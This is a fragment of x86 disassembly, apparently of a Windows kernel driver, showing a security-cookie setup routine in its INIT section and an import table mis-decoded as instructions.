   1ee1b:	outs   dx,DWORD PTR fs:[esi]
   1ee1d:	ja     0x1ee3f
   1ee1f:	jae    0x1ee8a
   1ee21:	jp     0x1ee88
   1ee23:	add    BYTE PTR [ebp+0x6e],dh
   1ee26:	imul   ebp,DWORD PTR [esi+0x6f],0x77
   1ee2a:	outs   dx,BYTE PTR ds:[esi]
   1ee2b:	and    BYTE PTR [ebx+0x6f],ah
   1ee2e:	ins    DWORD PTR es:[edi],dx
   1ee2f:	jo     0x1eea3
   1ee31:	gs jae 0x1eea7
   1ee34:	imul   ebp,DWORD PTR [edi+0x6e],0x74656d20
   1ee3b:	.byte 0x68
   1ee3c:	outs   dx,DWORD PTR ds:[esi]
   1ee3d:	fs
	...

Disassembly of section INIT:

0007fa00 <INIT>:
   7fa00:	add    BYTE PTR [eax],al
   7fa02:	add    BYTE PTR [eax],al
   7fa04:	add    BYTE PTR [ecx+0x7eb38],ah
   7fa0a:	mov    ecx,0xbb40e64e
   7fa0f:	test   eax,eax
   7fa11:	je     0x7fa17
   7fa13:	cmp    eax,ecx
   7fa15:	jne    0x7fa31
   7fa17:	mov    eax,ds:0x1f058
   7fa1c:	mov    eax,DWORD PTR [eax]
   7fa1e:	xor    eax,0x7eb38
   7fa23:	mov    ds:0x7eb38,eax
   7fa28:	jne    0x7fa31
   7fa2a:	mov    eax,ecx
   7fa2c:	mov    ds:0x7eb38,eax
   7fa31:	not    eax
   7fa33:	mov    ds:0x7eb3c,eax
   7fa38:	ret    
   7fa39:	inc    edi
   7fa3a:	in     eax,dx
   7fa3b:	dec    edx
   7fa3c:	dec    esi
   7fa3d:	test   al,0x8b
   7fa3f:	call   DWORD PTR [ebp-0x75]
   7fa42:	in     al,dx
   7fa43:	call   0x7fa05
   7fa48:	pop    ebp
   7fa49:	jmp    0x191e6
   7fa4e:	int3   
   7fa4f:	int3   
   7fa50:	xchg   esp,eax
   7fa51:	cli    
   7fa52:	push   es
	...
   7fa5b:	add    BYTE PTR [eax+0x80006fc],ah
   7fa61:	lock add BYTE PTR [eax],al
   7fa64:	mov    edx,?
   7fa66:	push   es
	...
   7fa6f:	add    dl,al
   7fa71:	cld    
   7fa72:	push   es
   7fa73:	add    BYTE PTR [eax],al
   7fa75:	lock add BYTE PTR [eax],al
	...
   7fa8c:	scas   al,BYTE PTR es:[edi]
   7fa8d:	cld    
   7fa8e:	push   es
   7fa8f:	add    BYTE PTR [eax],al
   7fa91:	add    BYTE PTR [eax],al
   7fa93:	add    BYTE PTR [esi],al
   7fa95:	sti    
   7fa96:	push   es
   7fa97:	add    BYTE PTR [eax],dl
   7fa99:	sti    
   7fa9a:	push   es
   7fa9b:	add    BYTE PTR [edx],bl
   7fa9d:	sti    
   7fa9e:	push   es
   7fa9f:	add    BYTE PTR [ebx+edi*8],ah
   7faa2:	push   es
   7faa3:	add    BYTE PTR [ebx+edi*8],dh
   7faa6:	push   es
   7faa7:	add    BYTE PTR [ebx+edi*8+0x6],dl
   7faab:	add    BYTE PTR [eax-0x5],ch
   7faae:	push   es
   7faaf:	add    BYTE PTR [edx-0x6bfff905],al
   7fab5:	sti    
   7fab6:	push   es
   7fab7:	add    BYTE PTR [ebx+edi*8-0x43bfffa],ch
   7fabe:	push   es
   7fabf:	add    dl,ch
   7fac1:	sti    
   7fac2:	push   es
   7fac3:	add    BYTE PTR [edx],al
   7fac5:	cld    
   7fac6:	push   es
   7fac7:	add    BYTE PTR [esp+edi*8],cl
   7faca:	push   es
   7facb:	add    BYTE PTR [esi],dl
   7facd:	cld    
   7face:	push   es
   7facf:	add    BYTE PTR [eax],dh
   7fad1:	cld    
   7fad2:	push   es
   7fad3:	add    BYTE PTR [esi-0x4],al
   7fad6:	push   es
   7fad7:	add    BYTE PTR [edx-0x4],dl
   7fada:	push   es
   7fadb:	add    BYTE PTR [esi-0x4],ah
   7fade:	push   es
   7fadf:	add    BYTE PTR [eax-0x4],dh
   7fae2:	push   es
   7fae3:	add    BYTE PTR [edx-0x6ffff904],al
   7fae9:	cld    
   7faea:	push   es
   7faeb:	add    ah,bh
   7faed:	cli    
   7faee:	push   es
   7faef:	add    dh,cl
   7faf1:	sti    
   7faf2:	push   es
   7faf3:	add    dl,cl
   7faf5:	cld    
   7faf6:	push   es
   7faf7:	add    BYTE PTR [eax],al
   7faf9:	add    BYTE PTR [eax],al
   7fafb:	add    BYTE PTR [ebx],cl
   7fafd:	add    eax,0x6c43775a
   7fb02:	outs   dx,DWORD PTR ds:[esi]
   7fb03:	jae    0x7fb6a
   7fb05:	add    BYTE PTR [ebx+0x5],bh
   7fb08:	pop    edi
   7fb09:	popa   
   7fb0a:	ins    BYTE PTR es:[edi],dx
   7fb0b:	ins    BYTE PTR es:[edi],dx
   7fb0c:	ins    DWORD PTR es:[edi],dx
   7fb0d:	jne    0x7fb7b
   7fb0f:	add    BYTE PTR [ecx+0x5],bh
   7fb12:	pop    edi
   7fb13:	popa   
   7fb14:	ins    BYTE PTR es:[edi],dx
   7fb15:	ins    BYTE PTR es:[edi],dx
   7fb16:	imul   esi,DWORD PTR fs:[esi+0x0],0x615f057d
   7fb1e:	ins    BYTE PTR es:[edi],dx
   7fb1f:	ins    BYTE PTR es:[edi],dx
   7fb20:	jb     0x7fb87
   7fb22:	ins    DWORD PTR es:[edi],dx
   7fb23:	add    BYTE PTR [ebp+0x0],dh
   7fb26:	inc    ebp
   7fb27:	js     0x7fb7b
   7fb29:	popa   
   7fb2a:	imul   esi,DWORD PTR [ebx+0x65],0x74617453
   7fb31:	jne    0x7fba6
   7fb33:	add    BYTE PTR [edx+0x0],al
   7fb36:	inc    ebp
   7fb37:	js     0x7fb7a
   7fb39:	ins    BYTE PTR es:[edi],dx
   7fb3a:	ins    BYTE PTR es:[edi],dx
   7fb3b:	outs   dx,DWORD PTR ds:[esi]
   7fb3c:	arpl   WORD PTR [ecx+0x74],sp
   7fb3f:	gs push eax
   7fb41:	outs   dx,DWORD PTR ds:[esi]
   7fb42:	outs   dx,DWORD PTR ds:[esi]
   7fb43:	ins    BYTE PTR es:[edi],dx
   7fb44:	push   edi
   7fb45:	imul   esi,DWORD PTR [eax+ebp*2+0x54],0x72506761
   7fb4d:	imul   ebp,DWORD PTR [edi+0x72],0x797469
   7fb54:	dec    esi
   7fb55:	add    BYTE PTR [ebp+0x78],al
   7fb58:	inc    esi
   7fb59:	jb     0x7fbc0
   7fb5b:	gs push eax
   7fb5d:	outs   dx,DWORD PTR ds:[esi]
   7fb5e:	outs   dx,DWORD PTR ds:[esi]
   7fb5f:	ins    BYTE PTR es:[edi],dx
   7fb60:	push   edi
   7fb61:	imul   esi,DWORD PTR [eax+ebp*2+0x54],0xbd006761
   7fb69:	add    edx,DWORD PTR [edx+0x74]
   7fb6c:	ins    BYTE PTR es:[edi],dx
   7fb6d:	inc    ebx
   7fb6e:	outs   dx,DWORD PTR ds:[esi]
   7fb6f:	ins    DWORD PTR es:[edi],dx
   7fb70:	jo     0x7fbd3
   7fb72:	jb     0x7fbd9
   7fb74:	push   ebp
   7fb75:	outs   dx,BYTE PTR ds:[esi]
   7fb76:	imul   esp,DWORD PTR [ebx+0x6f],0x74536564
   7fb7d:	jb     0x7fbe8
   7fb7f:	outs   dx,BYTE PTR ds:[esi]
   7fb80:	add    BYTE PTR [bp+si+0x2],al
   7fb84:	dec    ebx
   7fb85:	gs push edx
   7fb87:	gs ins BYTE PTR es:[edi],dx
   7fb89:	gs popa 
   7fb8b:	jae    0x7fbf2
   7fb8d:	dec    ebp
   7fb8e:	jne    0x7fc04
   7fb90:	gs js  0x7fb93
   7fb93:	add    BYTE PTR [ebp+0x2],ch
   7fb96:	dec    ebx
   7fb97:	gs push edi
   7fb99:	popa   
   7fb9a:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x6e695372
   7fba2:	ins    BYTE PTR es:[di],dx
   7fba4:	gs dec edi
   7fba6:	bound  ebp,QWORD PTR [edx+0x65]
   7fba9:	arpl   WORD PTR [eax+eax*1+0x41],si
   7fbad:	add    BYTE PTR [ebp+0x78],al
   7fbb0:	inc    ecx
   7fbb1:	ins    BYTE PTR es:[edi],dx
   7fbb2:	ins    BYTE PTR es:[edi],dx
   7fbb3:	outs   dx,DWORD PTR ds:[esi]
   7fbb4:	arpl   WORD PTR [ecx+0x74],sp
   7fbb7:	gs push eax
   7fbb9:	outs   dx,DWORD PTR ds:[esi]
   7fbba:	outs   dx,DWORD PTR ds:[esi]
   7fbbb:	ins    BYTE PTR es:[edi],dx
   7fbbc:	push   edi
   7fbbd:	imul   esi,DWORD PTR [eax+ebp*2+0x54],0xa7006761
   7fbc5:	add    eax,0x636d656d
   7fbca:	jo     0x7fc45
   7fbcc:	add    BYTE PTR [eax],al
   7fbce:	mov    eax,ds:0x476d4d02
   7fbd3:	gs je  0x7fc29
   7fbd6:	jns    0x7fc4b
   7fbd8:	je     0x7fc3f
   7fbda:	ins    DWORD PTR es:[edi],dx
   7fbdb:	push   edx
   7fbdc:	outs   dx,DWORD PTR ds:[esi]
   7fbdd:	jne    0x7fc53
   7fbdf:	imul   ebp,DWORD PTR [esi+0x65],0x72646441
   7fbe6:	gs jae 0x7fc5c
   7fbe9:	add    bh,al
   7fbeb:	add    edx,DWORD PTR [edx+0x74]
   7fbee:	ins    BYTE PTR es:[edi],dx
   7fbef:	inc    ebx
   7fbf0:	outs   dx,DWORD PTR ds:[esi]
   7fbf1:	jo     0x7fc6c
   7fbf3:	push   ebp
   7fbf4:	outs   dx,BYTE PTR ds:[esi]
   7fbf5:	imul   esp,DWORD PTR [ebx+0x6f],0x74536564
   7fbfc:	jb     0x7fc67
   7fbfe:	outs   dx,BYTE PTR ds:[esi]
   7fbff:	add    BYTE PTR [bx+si],al
   7fc02:	mov    DWORD PTR ds:0x6e736377,0x746163
   7fc0c:	test   eax,0x6d656d05
   7fc11:	jae    0x7fc78
   7fc13:	je     0x7fc15
   7fc15:	add    BYTE PTR [esi],al
   7fc17:	add    eax,0x6c41775a
   7fc1c:	ins    BYTE PTR es:[edi],dx
   7fc1d:	outs   dx,DWORD PTR ds:[esi]
   7fc1e:	arpl   WORD PTR [ecx+0x74],sp
   7fc21:	gs push esi
   7fc23:	imul   esi,DWORD PTR [edx+0x74],0x4d6c6175
   7fc2a:	gs ins DWORD PTR es:[edi],dx
   7fc2c:	outs   dx,DWORD PTR ds:[esi]
   7fc2d:	jb     0x7fca8
   7fc2f:	add    bl,ah
   7fc31:	add    DWORD PTR [ecx+0x6f],ecx
   7fc34:	inc    bx
   7fc36:	outs   dx,DWORD PTR ds:[esi]
   7fc37:	ins    DWORD PTR es:[edi],dx
   7fc38:	jo     0x7fca6
   7fc3a:	gs je  0x7fca2
   7fc3d:	push   edx
   7fc3e:	gs jno 0x7fcb6
   7fc41:	gs jae 0x7fcb8
   7fc44:	add    BYTE PTR [eax],al
   7fc46:	mov    ecx,0x70777305
   7fc4b:	jb     0x7fcb6
   7fc4d:	outs   dx,BYTE PTR ds:[esi]
   7fc4e:	je     0x7fcb6
   7fc50:	add    BYTE PTR [eax],al
   7fc52:	xor    eax,DWORD PTR [edx]
   7fc54:	dec    ebx
   7fc55:	gs push ecx
   7fc57:	jne    0x7fcbe
   7fc59:	jb     0x7fcd4
   7fc5b:	push   ebx
   7fc5c:	jns    0x7fcd1
   7fc5e:	je     0x7fcc5
   7fc60:	ins    DWORD PTR es:[edi],dx
   7fc61:	push   esp
   7fc62:	imul   ebp,DWORD PTR [ebp+0x65],0x7305ac00
   7fc69:	jo     0x7fcdd
   7fc6b:	imul   ebp,DWORD PTR [esi+0x74],0x5130066
   7fc72:	pop    edx
   7fc73:	ja     0x7fcb8
   7fc75:	jb     0x7fcdc
   7fc77:	popa   
   7fc78:	je     0x7fcdf
   7fc7a:	push   ebx
   7fc7b:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
   7fc80:	outs   dx,BYTE PTR ds:[esi]
   7fc81:	add    BYTE PTR [esi+0x2],ah
   7fc84:	dec    ebx
   7fc85:	gs push esp
   7fc87:	imul   esp,DWORD PTR [ebx+0x6b],0x6e756f43
   7fc8e:	je     0x7fc90
   7fc90:	test   BYTE PTR [ecx],0x4b
   7fc93:	gs inc edx
   7fc95:	jne    0x7fcfe
   7fc97:	inc    ebx
   7fc98:	push   0x456b6365
   7fc9d:	js     0x7fc9f
   7fc9f:	add    BYTE PTR [esi+0x74],ch
   7fca2:	outs   dx,DWORD PTR ds:[esi]
   7fca3:	jae    0x7fd10
   7fca5:	jb     0x7fd15
   7fca7:	ins    BYTE PTR es:[edi],dx
   7fca8:	cs gs js 0x7fd11
   7fcac:	add    BYTE PTR [eax],al
   7fcae:	inc    eax
   7fcaf:	add    BYTE PTR [ebx+0x65],cl
   7fcb2:	inc    edi
   7fcb3:	gs je  0x7fcf9
   7fcb6:	jne    0x7fd2a
   7fcb8:	jb     0x7fd1f
   7fcba:	outs   dx,BYTE PTR ds:[esi]
   7fcbb:	je     0x7fd06
   7fcbd:	jb     0x7fd30
   7fcbf:	ins    BYTE PTR es:[edi],dx
   7fcc0:	add    BYTE PTR [eax],al
   7fcc2:	dec    eax
   7fcc3:	inc    ecx
   7fcc4:	dec    esp
   7fcc5:	cs fs ins BYTE PTR es:[edi],dx
   7fcc8:	ins    BYTE PTR es:[edi],dx
   7fcc9:	add    BYTE PTR [eax+0x6c745204],ah
   7fccf:	push   ebp
   7fcd0:	outs   dx,BYTE PTR ds:[esi]
   7fcd1:	ja     0x7fd3c
   7fcd3:	outs   dx,BYTE PTR ds:[esi]
   7fcd4:	fs
	...
